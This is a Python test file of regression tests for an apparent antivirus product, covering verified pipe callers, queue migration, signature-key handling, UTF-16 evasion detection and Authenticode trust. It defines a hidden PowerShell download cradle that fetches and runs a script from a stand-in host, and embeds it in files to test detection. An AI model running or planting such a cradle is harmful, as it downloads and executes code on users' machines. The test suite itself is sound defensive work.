"""Fix round 2 regression tests (ARGUS.EXE v1.1.0, unreleased).

Names carry the round-2 fix ids:
- FIX 1 — privileged actions require a PROCESS-VERIFIED pipe
  caller in the installed Windows layout (re-audit P0-1 residual:
  entry actions were forgeable through the file channel).
- FIX 2 — legacy pending migration is provenance-only
  (entry-bound, blob-decrypt verified) and one-time.
- FIX 3 — signature DB bootstrap defers authentication to the
  service when the key is unreadable by the caller's account.
- FIX 4 — mixed-content UTF-16 evasion: segment/sample-based
  routing + dual-parity folded rule views.
- FIX 5 — Microsoft system-file trust requires WinVerifyTrust
  on Windows (injectable verifier here).
- FIX 6 — the re-audit P2 batch (raw OS error text, watcher hash
  cost, results GC, approve pre-hash placement, coverage note,
  simulation fail-safe).
"""

from __future__ import annotations

import hashlib
import json
import os
import shutil
import sqlite3
import sys
import time
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent))

from argus import action_requests, devtools, pipe_channel  # noqa: E402
from argus.actions import ActionEngine, DetectionInfo  # noqa: E402
from argus.config import ArgusConfig  # noqa: E402
from argus.detections import Verdict  # noqa: E402
from argus.heuristics.analyze import _decode_script, analyze_file  # noqa: E402
from argus.platform_authenticode import (  # noqa: E402
    STATUS_FAILED,
    STATUS_VERIFIED,
    AuthenticodeResult,
)
from argus.quarantine import QuarantineError, Vault  # noqa: E402
from argus.rules import BUILTIN_RULES  # noqa: E402
from argus.scanner import scan_file  # noqa: E402
from argus.service import ArgusService  # noqa: E402
from argus.signatures import (  # noqa: E402
    SignatureDB,
    SignatureError,
    bootstrap_signature_db,
    ensure_signature_db,
    init_db,
    key_path_for,
)

EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

CRADLE = (
    "powershell -nop -w hidden -c \"IEX (New-Object "
    "Net.WebClient).DownloadString('http://evil.example/payload.ps1')\""
)


def _sha(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _info(data: bytes, name="Test.Detection"):
    return DetectionInfo(
        name=name, severity="high", verdict="Malicious",
        reasons=["test"], sha256=_sha(data),
    )


@pytest.fixture()
def db(tmp_path):
    path = tmp_path / "sigs.sigdb"
    init_db(path)
    with SignatureDB.open(path) as handle:
        yield handle


@pytest.fixture()
def svc_env(tmp_path, monkeypatch):
    """A service wired to a real vault + actions, in the shape
    the channel tests drive (mirrors test_hunt_c_channel)."""
    shared = tmp_path / "shared"
    req = shared / "requests"
    res = shared / "results"
    req.mkdir(parents=True)
    res.mkdir(parents=True)
    monkeypatch.setattr("argus.service.requests_dir", lambda: req)
    monkeypatch.setattr("argus.service.results_dir", lambda: res)
    monkeypatch.setattr(
        "argus.service.vault_view_path", lambda: shared / "vault-view.json"
    )
    monkeypatch.setattr(
        "argus.service.pending_view_path", lambda: shared / "pending-view.json"
    )
    config = ArgusConfig(status_file=str(tmp_path / "status.json"))
    vault = Vault.open(tmp_path / "vault", tmp_path / "trusted" / "pending.db")
    engine = ActionEngine(vault, config, config_path=tmp_path / "cfg.json")
    svc = ArgusService(config=config)
    svc.vault = vault
    svc.actions = engine
    svc.state = "running"
    yield {
        "svc": svc, "vault": vault, "engine": engine, "config": config,
        "root": tmp_path, "shared": shared, "req": req, "res": res,
    }
    vault.close()


# ======================================================================
# FIX 1 — the pipe verifies WHO is asking
# ======================================================================
class _FakeStream:
    """One in-memory pipe session: a scripted request in, the
    written responses captured."""

    def __init__(self, request):
        self._request = request
        self.written: list[dict] = []

    def read_message(self):
        return self._request

    def write_message(self, payload):
        self.written.append(payload)


class _FakeIdentityProvider(pipe_channel.ClientIdentityProvider):
    """pid -> ClientIdentity (or None) from a fixed table."""

    def __init__(self, mapping):
        self._mapping = mapping

    def identify(self, pid):
        return self._mapping.get(pid)


def _pipe_service(env, tmp_path, *, recorded):
    """An ArgusService whose pipe verification is fully injected:
    the canonical exe is a real file under tmp_path, its recorded
    fingerprint is *recorded*."""
    canonical = tmp_path / "Program Files" / "Argus" / "Argus.exe"
    canonical.parent.mkdir(parents=True, exist_ok=True)
    canonical.write_bytes(b"the genuine argus program")
    genuine = pipe_channel.ClientIdentity(
        image_path=canonical, sha256=_sha(b"the genuine argus program")
    )
    provider = _FakeIdentityProvider({4242: genuine})
    svc = ArgusService(
        config=env["config"],
        pipe_identity_provider=provider,
        pipe_canonical_exe=canonical,
        pipe_recorded_sha256=recorded,
        pipe_required=True,
        serve_pipe=False,
    )
    svc.vault = env["vault"]
    svc.actions = env["engine"]
    svc.state = "running"
    return svc, canonical, genuine


def _quarantined(env, tmp_path):
    target = tmp_path / "evil.exe"
    target.write_bytes(EICAR)
    return env["vault"].quarantine_file(target, detection_name="T"), target


def test_fix1_pipe_wrong_image_path_refused(svc_env, tmp_path):
    svc, canonical, _genuine = _pipe_service(
        svc_env, tmp_path, recorded=_sha(b"the genuine argus program")
    )
    # The caller runs the genuine BYTES from the WRONG address.
    impostor = tmp_path / "elsewhere" / "Argus.exe"
    impostor.parent.mkdir(parents=True)
    impostor.write_bytes(b"the genuine argus program")
    svc._pipe_identity_provider = _FakeIdentityProvider(
        {4242: pipe_channel.ClientIdentity(
            image_path=impostor, sha256=_sha(b"the genuine argus program")
        )}
    )
    entry, _target = _quarantined(svc_env, tmp_path)
    stream = _FakeStream(
        {"id": "r1", "kind": "restore", "entry_id": entry.id,
         "sha256": entry.sha256, "nonce": "n1"}
    )
    svc._pipe_session(stream, client_pid=4242)
    assert stream.written and stream.written[0]["ok"] is False
    assert svc_env["vault"].get_entry(entry.id).status == "quarantined"


def test_fix1_pipe_right_path_wrong_hash_refused(svc_env, tmp_path):
    svc, canonical, _genuine = _pipe_service(
        svc_env, tmp_path, recorded=_sha(b"the genuine argus program")
    )
    # Right address, replaced bytes: the fingerprint check is
    # what stands between "file named Argus.exe" and trust.
    svc._pipe_identity_provider = _FakeIdentityProvider(
        {4242: pipe_channel.ClientIdentity(
            image_path=canonical, sha256=_sha(b"a replaced program")
        )}
    )
    entry, _target = _quarantined(svc_env, tmp_path)
    stream = _FakeStream(
        {"id": "r1", "kind": "delete", "entry_id": entry.id,
         "sha256": entry.sha256, "nonce": "n1"}
    )
    svc._pipe_session(stream, client_pid=4242)
    assert stream.written and stream.written[0]["ok"] is False
    assert svc_env["vault"].get_entry(entry.id).status == "quarantined"


def test_fix1_pipe_verified_caller_executes_restore(svc_env, tmp_path):
    svc, _canonical, _genuine = _pipe_service(
        svc_env, tmp_path, recorded=_sha(b"the genuine argus program")
    )
    entry, target = _quarantined(svc_env, tmp_path)
    assert not target.exists()  # quarantined away
    stream = _FakeStream(
        {"id": "r1", "kind": "restore", "entry_id": entry.id,
         "sha256": entry.sha256, "nonce": "n1"}
    )
    svc._pipe_session(stream, client_pid=4242)
    assert stream.written[0]["ok"] is True
    assert stream.written[0]["nonce"] == "n1"
    assert target.exists()  # really restored


def test_fix1_pipe_missing_fingerprint_record_refuses(svc_env, tmp_path):
    # No setup-recorded fingerprint: NOTHING can be verified, so
    # even a perfect-looking caller is refused.
    svc, _c, _g = _pipe_service(svc_env, tmp_path, recorded=None)
    entry, _target = _quarantined(svc_env, tmp_path)
    stream = _FakeStream(
        {"id": "r1", "kind": "restore", "entry_id": entry.id,
         "sha256": entry.sha256, "nonce": "n1"}
    )
    svc._pipe_session(stream, client_pid=4242)
    assert stream.written and stream.written[0]["ok"] is False
    assert svc_env["vault"].get_entry(entry.id).status == "quarantined"


def test_fix1_pipe_unidentifiable_caller_refused(svc_env, tmp_path):
    svc, _c, _g = _pipe_service(
        svc_env, tmp_path, recorded=_sha(b"the genuine argus program")
    )
    svc._pipe_identity_provider = _FakeIdentityProvider({})  # knows nobody
    entry, _target = _quarantined(svc_env, tmp_path)
    stream = _FakeStream(
        {"id": "r1", "kind": "restore", "entry_id": entry.id,
         "sha256": entry.sha256, "nonce": "n1"}
    )
    svc._pipe_session(stream, client_pid=9999)
    assert stream.written and stream.written[0]["ok"] is False
    assert svc_env["vault"].get_entry(entry.id).status == "quarantined"


def test_fix1_file_channel_privileged_refused_when_pipe_required(
    svc_env, tmp_path
):
    """The re-audit's forgery, replayed against the round-2
    service: a perfectly-formed restore request dropped as a
    FILE (valid id, valid — public — fingerprint) must be
    refused, not executed, when the pipe is required."""
    svc, _c, _g = _pipe_service(
        svc_env, tmp_path, recorded=_sha(b"the genuine argus program")
    )
    entry, _target = _quarantined(svc_env, tmp_path)
    rid = "forged1"
    (svc_env["req"] / f"{rid}.json").write_text(
        json.dumps(
            {"id": rid, "kind": "restore", "entry_id": entry.id,
             "sha256": entry.sha256, "nonce": "attacker-nonce"}
        ),
        encoding="utf-8",
    )
    svc.process_requests_once()
    # Refused: filed under rejected/, NO result written, and the
    # entry is untouched.
    assert (svc_env["req"] / "rejected" / f"{rid}.json").exists()
    assert not (svc_env["res"] / f"{rid}.json").exists()
    assert svc_env["vault"].get_entry(entry.id).status == "quarantined"


def test_fix1_file_channel_still_works_without_pipe_requirement(svc_env):
    """The same file drop in a same-user layout (pipe not
    required) still executes — the pipe guards a privilege
    boundary, it is not a tax on portable/dev use."""
    entry, _target = _quarantined(svc_env, svc_env["root"])
    rid = "plain1"
    (svc_env["req"] / f"{rid}.json").write_text(
        json.dumps(
            {"id": rid, "kind": "restore", "entry_id": entry.id,
             "sha256": entry.sha256, "nonce": "n"}
        ),
        encoding="utf-8",
    )
    svc_env["svc"].process_requests_once()
    result = json.loads(
        (svc_env["res"] / f"{rid}.json").read_text(encoding="utf-8")
    )
    assert result["ok"] is True


def test_fix1_details_query_returns_service_row_not_view(svc_env, tmp_path):
    """The confirmation data comes from the SERVICE's records:
    a view file rewritten to lie about the path changes
    nothing the service reports."""
    svc, _c, _g = _pipe_service(
        svc_env, tmp_path, recorded=_sha(b"the genuine argus program")
    )
    entry, target = _quarantined(svc_env, tmp_path)
    # The unsigned view, tampered: claims the entry is a report.
    (svc_env["shared"] / "vault-view.json").write_text(
        json.dumps({"entries": [{
            "id": entry.id,
            "original_path": "C:/Users/victim/report.pdf",
            "sha256": entry.sha256,
        }]}),
        encoding="utf-8",
    )
    result = svc._dispatch_pipe_request(
        {"id": "q1", "kind": "entry-details", "entry_id": entry.id,
         "nonce": "nq"}
    )
    assert result["ok"] is True
    assert result["details"]["original_path"] == str(target)
    assert result["details"]["sha256"] == entry.sha256
    assert result["nonce"] == "nq"


def test_fix1_pending_details_returns_service_row(svc_env, tmp_path):
    svc, _c, _g = _pipe_service(
        svc_env, tmp_path, recorded=_sha(b"the genuine argus program")
    )
    target = tmp_path / "evil.exe"
    target.write_bytes(EICAR)
    pending = svc_env["engine"].enqueue(
        source="realtime", path=target, action="quarantine",
        info=_info(EICAR),
    )
    result = svc._dispatch_pipe_request(
        {"id": "q2", "kind": "pending-details",
         "pending_id": pending.id, "nonce": "nq"}
    )
    assert result["ok"] is True
    assert result["details"]["path"] == str(target)
    assert result["details"]["action"] == "quarantine"
    assert result["details"]["sha256"] == _sha(EICAR)


def test_fix1_client_rejects_response_with_wrong_nonce(monkeypatch):
    # The transport seam is the platform verified-channel resolver
    # (v1.2.0: the Windows pipe or the Linux socket, chosen by
    # _verified_roundtrip) — the client logic under test (nonce
    # gate, stage messages) is transport-agnostic.
    monkeypatch.setattr(
        action_requests, "_verified_roundtrip",
        lambda payload, timeout=30.0: {
            "id": payload["id"], "ok": True,
            "message": "done", "nonce": "not-the-request-nonce",
        },
    )
    result = action_requests._submit_via_pipe(
        "restore", entry_id="e1", pending_id=None,
        sha256="a" * 64, requested_by="test", timeout=5.0,
    )
    assert result.ok is False
    assert "identity stamp" in result.message


def test_fix1_pipe_unreachable_never_falls_back_to_file(
    svc_env, monkeypatch
):
    def _boom(payload, timeout=30.0):
        raise pipe_channel.PipeUnavailableError("connect", "no pipe")

    monkeypatch.setattr(action_requests, "_verified_roundtrip", _boom)
    monkeypatch.setattr(action_requests, "pipe_channel_required", lambda: True)
    result = action_requests.submit_and_wait(
        "restore", entry_id="e1", sha256="a" * 64,
        requested_by="test", timeout=5.0,
    )
    assert result.ok is False
    assert "couldn't reach its protection service" in result.message
    # The forgery-prone fallback never happened: no request file.
    assert list(svc_env["req"].glob("*.json")) == []


def test_fix1_pipe_lost_mid_exchange_message_differs(monkeypatch):
    def _boom(payload, timeout=30.0):
        raise pipe_channel.PipeUnavailableError("read", "gone quiet")

    monkeypatch.setattr(action_requests, "_verified_roundtrip", _boom)
    result = action_requests._submit_via_pipe(
        "restore", entry_id="e1", pending_id=None,
        sha256="a" * 64, requested_by="test", timeout=5.0,
    )
    assert result.ok is False
    assert "stopped answering" in result.message
    assert "couldn't reach" not in result.message


# ======================================================================
# FIX 2 — migration provenance: entry-bound or dropped, once
# ======================================================================
def _legacy_vault(tmp_path, name="legacy"):
    legacy = tmp_path / name / "pending.db"
    return Vault.open(tmp_path / f"{name}-vault", legacy), legacy


def test_fix2_migration_entry_bound_row_migrates(svc_env, monkeypatch, tmp_path):
    vault = svc_env["vault"]
    anchor_target = tmp_path / "anchor.exe"
    anchor_target.write_bytes(EICAR)
    entry = vault.quarantine_file(anchor_target, detection_name="Anchor")
    lv, legacy = _legacy_vault(tmp_path)
    try:
        row = lv.add_pending(
            source="realtime", path=anchor_target, action="quarantine",
            sha256=_sha(EICAR),
        )
        lv.update_pending(row.id, status="pending", entry_id=entry.id)
        rid = row.id
    finally:
        lv.close()
    monkeypatch.setattr(
        "argus.service.legacy_shared_pending_db", lambda: legacy
    )
    svc_env["svc"]._migrate_legacy_pending(vault)
    assert vault.get_pending(rid) is not None
    assert svc_env["svc"]._legacy_pending_dropped == 0
    assert svc_env["svc"].status()["legacy_pending_dropped"] == 0


def test_fix2_migration_live_hash_only_row_dropped(
    svc_env, monkeypatch, tmp_path
):
    """The round-1 leg, replayed as an attack: a row naming an
    arbitrary victim file with the victim's REAL hash — and no
    vault entry — must NOT enter the trusted queue."""
    victim = tmp_path / "victim.txt"
    victim.write_bytes(b"important document")
    lv, legacy = _legacy_vault(tmp_path)
    try:
        row = lv.add_pending(
            source="realtime", path=victim, action="delete",
            sha256=_sha(b"important document"),
        )
        rid = row.id
    finally:
        lv.close()
    monkeypatch.setattr(
        "argus.service.legacy_shared_pending_db", lambda: legacy
    )
    svc_env["svc"]._migrate_legacy_pending(svc_env["vault"])
    assert svc_env["vault"].get_pending(rid) is None
    assert svc_env["svc"]._legacy_pending_dropped == 1
    assert svc_env["svc"].status()["legacy_pending_dropped"] == 1
    assert victim.exists()  # never touched


def test_fix2_migration_entry_with_wrong_content_dropped(
    svc_env, monkeypatch, tmp_path
):
    """Entry-bound is not enough: the entry's blob must decrypt
    to the row's fingerprint. A row pointing at a real entry
    with a DIFFERENT sha is dropped."""
    vault = svc_env["vault"]
    anchor_target = tmp_path / "anchor.exe"
    anchor_target.write_bytes(EICAR)
    entry = vault.quarantine_file(anchor_target, detection_name="Anchor")
    lv, legacy = _legacy_vault(tmp_path)
    try:
        row = lv.add_pending(
            source="realtime", path=anchor_target, action="quarantine",
            sha256=_sha(b"different bytes entirely"),
        )
        lv.update_pending(row.id, status="pending", entry_id=entry.id)
        rid = row.id
    finally:
        lv.close()
    monkeypatch.setattr(
        "argus.service.legacy_shared_pending_db", lambda: legacy
    )
    svc_env["svc"]._migrate_legacy_pending(vault)
    assert vault.get_pending(rid) is None
    assert svc_env["svc"]._legacy_pending_dropped == 1


def test_fix2_migration_runs_once_and_not_on_reload(
    svc_env, monkeypatch, tmp_path
):
    vault = svc_env["vault"]
    victim = tmp_path / "victim.txt"
    victim.write_bytes(b"important document")
    lv, legacy = _legacy_vault(tmp_path)
    try:
        lv.add_pending(
            source="realtime", path=victim, action="delete",
            sha256=_sha(b"important document"),
        )
    finally:
        lv.close()
    monkeypatch.setattr(
        "argus.service.legacy_shared_pending_db", lambda: legacy
    )
    svc = svc_env["svc"]
    svc._migrate_legacy_pending(vault)
    assert svc._legacy_pending_dropped == 1
    marker = Path(vault.pending_path).parent / "legacy-pending-migration.json"
    assert marker.is_file()
    assert json.loads(marker.read_text(encoding="utf-8"))["dropped"] == 1
    # A NEW legacy file appears (an old build re-created it) and
    # the pass is invoked again (as a config reload would): the
    # marker gates it — nothing re-runs, nothing is re-dropped,
    # the new file is not even renamed.
    lv2, legacy2 = _legacy_vault(tmp_path, name="legacy2")
    try:
        lv2.add_pending(
            source="realtime", path=victim, action="delete",
            sha256=_sha(b"important document"),
        )
    finally:
        lv2.close()
    monkeypatch.setattr(
        "argus.service.legacy_shared_pending_db", lambda: legacy2
    )
    svc._migrate_legacy_pending(vault)
    assert svc._legacy_pending_dropped == 1  # unchanged
    assert legacy2.is_file()  # untouched


def test_fix2_migration_wal_sidecars_honoured(svc_env, monkeypatch, tmp_path):
    """A crash-stranded queue: the row exists ONLY in the WAL
    sidecar (the connection that wrote it never checkpointed).
    Reading the bare .db would see nothing; the migration reads
    a snapshot WITH sidecars and migrates the entry-bound row."""
    vault = svc_env["vault"]
    anchor_target = tmp_path / "anchor.exe"
    anchor_target.write_bytes(EICAR)
    entry = vault.quarantine_file(anchor_target, detection_name="Anchor")

    stranded_dir = tmp_path / "stranded"
    stranded_dir.mkdir()
    scratch = tmp_path / "scratch" / "pending.db"
    lv = Vault.open(tmp_path / "scratch-vault", scratch)
    row = lv.add_pending(
        source="realtime", path=anchor_target, action="quarantine",
        sha256=_sha(EICAR),
    )
    lv.update_pending(row.id, status="pending", entry_id=entry.id)
    rid = row.id
    # Copy the files WHILE the vault is still open: the row lives
    # in the -wal sidecar of the copies, exactly like a crash.
    for suffix in ("", "-wal", "-shm"):
        src = scratch.parent / (scratch.name + suffix)
        if src.is_file():
            shutil.copy2(src, stranded_dir / (scratch.name + suffix))
    lv.close()
    stranded = stranded_dir / "pending.db"
    # Sanity: the stranded copy really is WAL-backed.
    assert (stranded_dir / "pending.db-wal").is_file()
    monkeypatch.setattr(
        "argus.service.legacy_shared_pending_db", lambda: stranded
    )
    svc_env["svc"]._migrate_legacy_pending(vault)
    assert vault.get_pending(rid) is not None


# ======================================================================
# FIX 3 — signature DB bootstrap contract
# ======================================================================
def _default_db_layout(tmp_path, monkeypatch):
    """A fake installed default: DB at the (patched) default
    location, its auth key in the (patched) vault directory."""
    db_file = tmp_path / "data" / "signatures.sigdb"
    vault_dir = tmp_path / "data" / "quarantine"
    key_file = vault_dir / "signatures.sigdb.key"
    monkeypatch.setattr(
        "argus.signatures.default_signature_db_path", lambda: db_file
    )
    monkeypatch.setattr(
        "argus.signatures.default_vault_dir", lambda: vault_dir
    )
    db_file.parent.mkdir(parents=True, exist_ok=True)
    init_db(db_file)  # writes key to key_file via key_path_for
    assert key_file.is_file()
    return db_file, key_file


def test_fix3_default_db_unreadable_key_defers(tmp_path, monkeypatch):
    db_file, key_file = _default_db_layout(tmp_path, monkeypatch)
    # The standard user's view of the installed layout: the
    # vault-subtree key simply isn't there to read.
    key_file.unlink()
    info = ensure_signature_db(db_file)
    assert info is not None
    assert info.auth_deferred is True
    assert info.auth_verified is False
    info2 = bootstrap_signature_db(db_file)
    assert info2 is not None and info2.auth_deferred is True
    # And the DB still OPENS for lookups (structure verified) —
    # scans proceed; the service remains the strict verifier.
    with SignatureDB.open(db_file) as handle:
        assert handle.lookup("0" * 64) is None


def test_fix3_default_db_wrong_key_still_fails_loud(tmp_path, monkeypatch):
    db_file, key_file = _default_db_layout(tmp_path, monkeypatch)
    key_file.write_bytes(b"x" * 32)  # readable but WRONG key
    with pytest.raises(SignatureError):
        ensure_signature_db(db_file)


def test_fix3_custom_db_unreadable_key_still_raises(tmp_path):
    custom = tmp_path / "custom.sigdb"
    init_db(custom)  # key beside the DB (custom layout)
    key = tmp_path / "custom.sigdb.key"
    assert key.is_file()
    key.unlink()
    with pytest.raises(SignatureError):
        ensure_signature_db(custom)


def test_fix3_key_path_for_canonicalizes_symlink_spelling(
    tmp_path, monkeypatch
):
    real_dir = tmp_path / "real"
    real_dir.mkdir()
    link_dir = tmp_path / "link"
    os.symlink(real_dir, link_dir, target_is_directory=True)
    default_db = real_dir / "signatures.sigdb"
    vault_dir = real_dir / "vault"
    default_key = vault_dir / "signatures.sigdb.key"
    monkeypatch.setattr(
        "argus.signatures.default_signature_db_path", lambda: default_db
    )
    monkeypatch.setattr(
        "argus.signatures.default_vault_dir", lambda: vault_dir
    )
    # The same database spelled through the symlink must map to
    # the same (default) key — never to a beside-the-DB key an
    # attacker-controlled spelling could redirect.
    assert key_path_for(link_dir / "signatures.sigdb") == default_key


def test_fix3_init_db_unwritable_location_wraps_error(tmp_path):
    blocker = tmp_path / "blocker"
    blocker.write_bytes(b"i am a file, not a directory")
    target = blocker / "sigs.sigdb"
    with pytest.raises(SignatureError) as excinfo:
        init_db(target)
    assert "could not create" in str(excinfo.value)
    assert "[Errno" not in str(excinfo.value)


# ======================================================================
# FIX 4 — mixed-content UTF-16 routing
# ======================================================================
def test_fix4_ascii_preface_utf16_cradle_in_txt_detected(db, tmp_path):
    target = tmp_path / "notes.txt"
    target.write_bytes(
        b"The quarterly report is ready. " * 70
        + CRADLE.encode("utf-16-le")
    )
    scanned = scan_file(target, db, BUILTIN_RULES)
    assert scanned.verdict is Verdict.MALICIOUS
    signal_names = {s.name for s in scanned.assessment.signals}
    assert "powershell_download_cradle" in signal_names


def test_fix4_cradle_behind_200kb_preface_detected(db, tmp_path):
    target = tmp_path / "big.txt"
    target.write_bytes(b"A" * 200_000 + CRADLE.encode("utf-16-le"))
    scanned = scan_file(target, db, BUILTIN_RULES)
    assert scanned.verdict is Verdict.MALICIOUS
    assert any(
        d.name == "Suspicious_PowerShell_Download"
        for d in scanned.assessment.detections
    )


def test_fix4_cradle_behind_1p5mb_preface_detected(db, tmp_path):
    target = tmp_path / "huge.txt"
    target.write_bytes(b"B" * 1_500_000 + CRADLE.encode("utf-16-le"))
    scanned = scan_file(target, db, BUILTIN_RULES)
    assert scanned.verdict is Verdict.MALICIOUS


def test_fix4_cradle_behind_odd_length_preface_detected(db, tmp_path):
    """An odd-length preface puts the cradle on the ODD byte
    parity: only the second folded view can see it whole."""
    target = tmp_path / "odd.txt"
    target.write_bytes(b"X" * 999 + CRADLE.encode("utf-16-le"))
    scanned = scan_file(target, db, BUILTIN_RULES)
    assert scanned.verdict is Verdict.MALICIOUS


def test_fix4_benign_utf16_document_stays_clean(db, tmp_path):
    target = tmp_path / "readme.txt"
    target.write_bytes(
        (
            "Meeting notes\r\n"
            + "Everything is fine, nothing to see here.\r\n" * 40
        ).encode("utf-16")
    )
    scanned = scan_file(target, db, BUILTIN_RULES)
    assert scanned.verdict is Verdict.CLEAN


def test_fix4_decode_script_reads_prefaced_utf16():
    raw = b"An ordinary English preface. " * 30 + CRADLE.encode("utf-16-le")
    text = _decode_script(raw)
    assert "DownloadString" in text
    assert "powershell" in text


# ======================================================================
# FIX 5 — WinVerifyTrust gates Microsoft trust (verifier injected)
# ======================================================================
import test_hunt_b_detection as _hunt_b  # noqa: E402

complete_microsoft_pe = _hunt_b.complete_microsoft_pe


@pytest.fixture()
def windows_tree(tmp_path):
    root = tmp_path / "Windows"
    system32 = root / "System32"
    system32.mkdir(parents=True)
    return root, system32


def _verifier(status, hresult=0):
    def _verify(path):
        return AuthenticodeResult(status, hresult, "test double")

    return _verify


def test_fix5_authenticode_verified_grants_trust(windows_tree):
    root, system32 = windows_tree
    target = system32 / "driverhost.exe"
    target.write_bytes(complete_microsoft_pe())
    report = analyze_file(
        target, windows_root_dir=root,
        authenticode_verifier=_verifier(STATUS_VERIFIED),
    )
    assert report.trusted_system_file is True


def test_fix5_authenticode_failure_blocks_trust(windows_tree):
    """The round-1 forgery class, closed on Windows: a complete-
    looking Microsoft SignerInfo whose signature CONTENT is
    garbage. DER parsing cannot tell; WinVerifyTrust can — and
    its refusal means NO trust."""
    root, system32 = windows_tree
    target = system32 / "driverhost.exe"
    target.write_bytes(complete_microsoft_pe())
    report = analyze_file(
        target, windows_root_dir=root,
        authenticode_verifier=_verifier(STATUS_FAILED, 0x800B0100),
    )
    assert report.trusted_system_file is False
    assert any("WinVerifyTrust" in note for note in report.notes)


def test_fix5_authenticode_exception_fails_closed(windows_tree):
    root, system32 = windows_tree
    target = system32 / "driverhost.exe"
    target.write_bytes(complete_microsoft_pe())

    def _boom(path):
        raise RuntimeError("verifier exploded")

    report = analyze_file(
        target, windows_root_dir=root, authenticode_verifier=_boom
    )
    assert report.trusted_system_file is False


def test_fix5_no_verifier_is_claim_based_fallback(windows_tree):
    """Off Windows no verifier exists: trust stays claim-based
    (the documented dev/non-Windows fallback — the shipped
    Windows posture is the test above)."""
    root, system32 = windows_tree
    target = system32 / "driverhost.exe"
    target.write_bytes(complete_microsoft_pe())
    report = analyze_file(target, windows_root_dir=root)
    if sys.platform != "win32":
        assert report.trusted_system_file is True


# ======================================================================
# FIX 6 — the re-audit P2 batch
# ======================================================================
def test_fix6_vault_error_messages_carry_no_os_text(tmp_path):
    vault = Vault.open(tmp_path / "vault", tmp_path / "p.db")
    try:
        with pytest.raises(QuarantineError) as excinfo:
            vault._verify_blob(tmp_path / "missing.blob", "0" * 64)
        message = str(excinfo.value)
        assert "[Errno" not in message
        assert "No such file" not in message
    finally:
        vault.close()


def test_fix6_watcher_hashes_only_settled_or_new_files(tmp_path, monkeypatch):
    from argus import watcher as watcher_mod

    calls: list[Path] = []
    real_hash = watcher_mod.sampled_content_hash

    def counting(path, size):
        calls.append(Path(path))
        return real_hash(path, size)

    monkeypatch.setattr(watcher_mod, "sampled_content_hash", counting)
    target = tmp_path / "watched.bin"
    target.write_bytes(b"version one")
    watcher = watcher_mod.DirectoryWatcher([tmp_path], stable_polls=2)
    watcher.poll_once()          # first sight: fingerprint taken
    assert len(calls) == 1
    watcher.poll_once()          # settled, stat matches: identity check
    assert len(calls) == 2
    target.write_bytes(b"version two - changed and longer")
    watcher.poll_once()          # stat changed: NO content read
    assert len(calls) == 2
    watcher.poll_once()          # stat stands still: hash arrives
    assert len(calls) == 3


def test_fix6_results_gc_prunes_old_results(svc_env):
    old = svc_env["res"] / "old.json"
    old.write_text("{}", encoding="utf-8")
    fresh = svc_env["res"] / "fresh.json"
    fresh.write_text("{}", encoding="utf-8")
    stale = time.time() - 25 * 3600
    os.utime(old, (stale, stale))
    svc_env["svc"]._prune_old_results()
    assert not old.exists()
    assert fresh.exists()


def test_fix6_approve_prehash_outside_lock_still_refuses(svc_env):
    """The wrapper pre-hashes before the lock now; the refusal
    semantics are unchanged: a changed file is refused and the
    queue row is NOT marked."""
    target = svc_env["root"] / "evil.exe"
    target.write_bytes(EICAR)
    pending = svc_env["engine"].enqueue(
        source="realtime", path=target, action="quarantine",
        info=_info(EICAR),
    )
    target.write_bytes(b"changed after queueing")
    result = svc_env["svc"]._execute_request(
        {"id": "r", "kind": "approve-pending",
         "pending_id": pending.id, "sha256": _sha(EICAR)}
    )
    assert result["ok"] is False
    assert svc_env["vault"].get_pending(pending.id).status == "pending"
    assert target.read_bytes() == b"changed after queueing"


def test_fix6_coverage_note_reaches_scan_notes(db, tmp_path, monkeypatch):
    from argus.rules import RuleMatcher

    class _JumpClock:
        def __init__(self, calm_reads=2):
            self.calls = 0
            self.calm_reads = calm_reads

        def __call__(self):
            self.calls += 1
            return 0.0 if self.calls <= self.calm_reads else 1000.0

    real_matcher = RuleMatcher

    def factory(rules, **kwargs):
        matcher = real_matcher(rules, time_budget=2.0)
        matcher._clock = _JumpClock()
        return matcher

    monkeypatch.setattr("argus.scanner.RuleMatcher", factory)
    target = tmp_path / "big.txt"
    target.write_bytes(b"z" * 300_000)
    scanned = scan_file(target, db, BUILTIN_RULES)
    assert any("tail pass" in note for note in scanned.assessment.notes)


def test_fix6_corrupt_sim_settings_fail_safe_on(tmp_path, monkeypatch):
    settings = tmp_path / "argus-devtools.json"
    settings.write_text("{not json at all", encoding="utf-8")
    on, warning = devtools.simulation_status(settings)
    assert on is True
    assert warning  # a surfaced warning, not silence
    monkeypatch.setattr(
        devtools, "default_devtools_path", lambda: settings
    )
    assert devtools.simulation_mode_enabled() is True


def test_fix6_sim_settings_matrix(tmp_path):
    settings = tmp_path / "argus-devtools.json"
    # Missing file: off, no warning.
    assert devtools.simulation_status(settings) == (False, None)
    # Explicit off / on are honoured.
    settings.write_text(json.dumps({"simulation_mode": False}))
    assert devtools.simulation_status(settings) == (False, None)
    settings.write_text(json.dumps({"simulation_mode": True}))
    assert devtools.simulation_status(settings) == (True, None)
    # A non-boolean flag is unparseable intent: fail safe ON.
    settings.write_text(json.dumps({"simulation_mode": "yes"}))
    on, warning = devtools.simulation_status(settings)
    assert on is True and warning
    # A non-object file likewise.
    settings.write_text(json.dumps(["simulation_mode"]))
    on, warning = devtools.simulation_status(settings)
    assert on is True and warning


# ======================================================================
# FIX 3 (GUI) + FIX 2 (GUI) — dashboard surfaces
# ======================================================================
try:
    from PySide6.QtWidgets import QApplication  # noqa: F401

    _HAVE_QT = True
except Exception:
    _HAVE_QT = False

pytestmark_gui = pytest.mark.skipif(
    not _HAVE_QT, reason="PySide6 not available in this interpreter"
)


@pytest.fixture(scope="session")
def qapp():
    if not _HAVE_QT:
        pytest.skip("PySide6 not available")
    app = QApplication.instance() or QApplication([])
    yield app


@pytest.fixture()
def gui_backend(tmp_path, monkeypatch):
    data_root = tmp_path / "argus-data"
    data_root.mkdir()
    monkeypatch.setenv("ARGUS_DATA_DIR", str(data_root))
    from argus.gui.backend import GuiBackend

    db_path = tmp_path / "signatures.sigdb"
    init_db(db_path, seed=True)
    backend = GuiBackend(
        config_path=tmp_path / "argus-config.json",
        devtools_path=tmp_path / "devtools.json",
    )
    backend.config.signature_db = str(db_path)
    backend.config.status_file = str(tmp_path / "status.json")
    backend.config.vault_dir = str(tmp_path / "vault")
